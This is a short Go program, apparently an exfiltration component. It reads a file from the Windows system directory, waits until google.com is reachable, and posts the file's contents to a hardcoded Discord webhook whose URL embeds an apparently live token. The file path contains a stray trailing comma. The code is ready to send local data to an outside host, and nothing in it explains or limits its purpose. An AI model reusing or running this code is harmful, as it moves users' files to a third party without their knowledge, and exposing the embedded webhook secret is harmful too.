package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

const webhookURL = "https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe"

func waitForGoogle() {
	for {
		resp, err := http.Get("https://google.com")
		if err == nil && resp.StatusCode == http.StatusOK {
			resp.Body.Close()
			break
		}
		time.Sleep(10 * time.Second)
	}
}

func main() {
	// Read the content of the input file
	data, err := ioutil.ReadFile("C:/Windows/input.db,")
	if err != nil {
		fmt.Printf("Failed to read file: %v\n", err)
		return
	}

	// Prepare the JSON payload
	payload := map[string]string{
		"content": string(bytes.TrimSpace(data)),
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("Failed to marshal JSON: %v\n", err)
		return
	}

	// Wait for Google to be accessible
	waitForGoogle()

	// Send the POST request to the webhook
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("Failed to send POST request: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Handle the response
	if resp.StatusCode == http.StatusNoContent {
		fmt.Println("Message sent successfully!")
	} else {
		body, _ := ioutil.ReadAll(resp.Body)
		fmt.Printf("Failed to send message. Status code: %d, Response: %s\n", resp.StatusCode, string(body))
	}
}
